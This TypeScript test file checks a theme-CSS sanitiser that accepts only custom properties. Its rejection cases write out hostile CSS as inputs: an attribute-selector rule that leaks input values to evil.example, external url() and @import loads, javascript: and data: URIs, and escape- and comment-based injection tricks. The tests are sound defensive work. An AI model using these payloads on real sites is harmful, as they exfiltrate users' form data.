import { describe, expect, it } from "vitest";
import { applyThemeCSSPolicy } from "./theme-css-policy";

describe("applyThemeCSSPolicy", () => {
  it("accepts custom properties and wraps them in :root", () => {
    const res = applyThemeCSSPolicy("--accent: #ff0000; --radius: 8px");
    expect(res.css).toBe(":root{--accent:#ff0000;--radius:8px}");
    expect(res.accepted).toBe(2);
    expect(res.rejected).toEqual([]);
  });

  it("keeps a quoted value containing a semicolon in one declaration", () => {
    const res = applyThemeCSSPolicy(`--font: "Foo; Bar", sans-serif`);
    expect(res.accepted).toBe(1);
    expect(res.css).toContain(`"Foo; Bar"`);
  });

  it("drops whole rule blocks, which is what the old regex pass let through", () => {
    const res = applyThemeCSSPolicy("body { background: red }");
    expect(res.css).toBe("");
    expect(res.rejected).toHaveLength(1);
  });

  // The exfiltration the three-regex pass could not see: an attribute selector
  // whose match fires an outbound request for the character it matched.
  it("drops attribute-selector exfiltration", () => {
    const res = applyThemeCSSPolicy(
      `input[value^="a"] { background: url("https://evil.example/leak?c=a") }`,
    );
    expect(res.css).toBe("");
  });

  it.each([
    ["url in a value", `--bg: url("https://evil.example/x")`],
    ["protocol-relative url", "--bg: //evil.example/x"],
    ["bare external url", "--bg: https://evil.example/x"],
    ["image-set", `--bg: image-set("https://evil.example/x" 1x)`],
    ["@import", "--x: @import url(https://evil.example/x)"],
    ["javascript uri", "--x: javascript:alert(1)"],
    ["data uri", "--x: data:text/html,<script>"],
    ["css escape bypass", "--x: \\75 rl(https://evil.example/x)"],
    ["comment smuggling", "--x: red /* } body { */"],
    ["brace escape", "--x: red} body{background:blue"],
  ])("rejects %s", (_label, input) => {
    const res = applyThemeCSSPolicy(input);
    expect(res.css).toBe("");
    expect(res.rejected).toHaveLength(1);
  });

  it("rejects standard properties even outside a block", () => {
    const res = applyThemeCSSPolicy("background: red; color: blue");
    expect(res.css).toBe("");
    expect(res.rejected).toHaveLength(2);
  });

  it("keeps the valid declarations of a mixed payload", () => {
    const res = applyThemeCSSPolicy(`--ok: 4px; --bad: url("https://evil.example/x"); --ok2: red`);
    expect(res.css).toBe(":root{--ok:4px;--ok2:red}");
    expect(res.rejected).toHaveLength(1);
  });

  it("caps the declaration count and the value length", () => {
    const many = Array.from({ length: 250 }, (_, i) => `--v${i}: ${i}px`).join(";");
    expect(applyThemeCSSPolicy(many).accepted).toBe(200);
    expect(applyThemeCSSPolicy(`--x: ${"a".repeat(600)}`).css).toBe("");
  });

  it("returns empty css for empty or whitespace input", () => {
    expect(applyThemeCSSPolicy("").css).toBe("");
    expect(applyThemeCSSPolicy("   \n  ").css).toBe("");
  });
});
